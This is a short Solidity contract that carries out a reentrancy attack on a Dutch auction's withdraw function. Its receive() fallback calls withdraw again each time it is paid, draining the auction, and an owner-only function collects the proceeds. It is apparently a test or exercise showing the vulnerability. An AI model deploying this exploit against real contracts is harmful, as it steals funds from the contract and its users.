// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IDutchAuction} from "src/interfaces/IDutchAuction.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract ReentrancyAttackOnWithdraw is Ownable {
    IDutchAuction private dutchAuction;
    
    constructor(address _dutchAuctionAddress) Ownable(msg.sender) {
        dutchAuction = IDutchAuction(_dutchAuctionAddress);
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        (bool result, ) = msg.sender.call{ value: balance }("");
        require(result, "Withdrawal failed.");
    }

    function bid() external onlyOwner payable {
        dutchAuction.bid{value: msg.value}();
    }

    function attack() external onlyOwner {
        dutchAuction.withdraw();
    }

    receive() external payable {
        dutchAuction.withdraw();
    }
}